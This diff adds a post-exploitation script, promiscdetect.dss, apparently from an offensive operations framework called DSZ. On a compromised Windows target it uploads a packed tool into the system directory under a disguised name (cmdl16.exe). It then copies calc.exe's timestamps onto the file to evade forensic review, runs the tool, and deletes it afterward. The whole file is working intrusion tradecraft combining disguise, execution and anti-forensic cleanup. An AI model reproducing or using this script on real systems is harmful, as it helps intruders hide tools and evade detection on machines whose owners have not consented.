@@ -1,0 +1,63 @@
+#-------------------------------------------------------------------------------
+# File: promiscdetect.dss
+# Description: Uploads the promiscdetect.exe tool to the targets temp directory.
+#			It then executes it
+#			It will then delete the uploaded file and return the 
+#			targets system directory.
+# 25 July 2007  		Created....
+# 21 November 2008	Ported to DSZ
+#
+#-------------------------------------------------------------------------------
+
+@include "Ops_GenericFunctions.dsi";
+
+
+#make sure this is running on windows before we start!
+string $OS;
+_GetOsFamily($OS);
+if ($OS != "winnt") {
+	echo "* * *";
+	echo "* * * promiscdetect.dss needs to be run on a Windows OS";
+	echo "* * *";
+	return false;
+	}
+
+# Get paths that we'll need later
+string $ScriptsDir;
+Ops_GetScriptsPath($ScriptsDir);
+string $sSysPath;
+Ops_GetSystemPath($sSysPath);
+string $remoteToolName = "";
+GetEnv("remoteToolName", $remoteToolName);
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+if (!prompt("Do you want to upload the tool as \"$remoteToolName\" ?")) {
+	GetInput("What do you want to upload the tool as?", $remoteToolName);
+}
+
+SetEnv("remoteToolName", "$remoteToolName");
+
+@echo on;
+
+while (`put promiscdetect_safe_packed.exe -project Ops -name $remoteToolName` == false) {
+	if (prompt("File exists, delete \"$remoteToolName\"?")) {
+		`delete -file "$remoteToolName"`;
+		sleep(200);
+	} else {
+		return false;
+	}
+}
+
+`matchfiletimes -src $sSysPath\\calc.exe -dst $remoteToolName`;
+if(prompt("run -command \"$remoteToolName\" -redirect promiscdetect?")) {
+	`run -command "$remoteToolName" -redirect promiscdetect` ;
+}
+
+if (prompt("delete -file \"$remoteToolName\"?")) {
+	`delete -file "$remoteToolName"`;
+}
+
+return true;
+
